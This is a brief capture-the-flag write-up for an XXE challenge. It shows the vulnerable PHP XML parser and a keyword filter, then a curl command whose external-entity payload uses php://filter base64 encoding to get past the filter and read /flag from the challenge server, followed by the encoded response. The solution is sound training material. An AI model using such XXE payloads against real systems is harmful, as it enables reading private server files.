# xxeme

根据源代码，这是xxe注入

```
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    header("Content-Type: text/plain");
    $d = new DOMDocument();
    $data = file_get_contents("php://input");
    if(preg_match('/file|rot13/i', $data))
    {
        die('illegal!');
    }
    $d->loadXML($data, LIBXML_BIGLINES | LIBXML_COMPACT | LIBXML_DTDVALID | LIBXML_NOBLANKS | LIBXML_NOERROR | LIBXML_NOWARNING | LIBXML_NOENT);

    if ($d->validate()) {
        show($d, "");
    } else {
        echo "Invalid";
    }
```

2.payload如下：

 Prepare the xxe payload and use curl to make POST request. 

```
curl -d '<?xml version="1.0"?>  
<!DOCTYPE root [  
<!ELEMENT root (first, second, third)> 
<!ELEMENT first (#PCDATA)>  
<!ELEMENT second (#PCDATA)>  
<!ELEMENT third (#PCDATA)>  
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">]>   
<!-- Create a XML following the DTD -->  
<root> 
<first>1</first>  
<second>&xxe;</second>  
<third>World</third> 
</root>' -H "Content-Type: text/plain" -X POST http://34.136.219.163:31002/
```

3. Decode the base64 string from the response. 

   ```
   <!-- Create a XML following the DTD -->
   <root>
    <first>
     1
    </first>
    <second>
     TU9DU0NURntUaDFzXzFzX0V6X2J1dF92YWxpZH0K
    </second>
    <third>
     World
    </third>
   </root>
   ```

   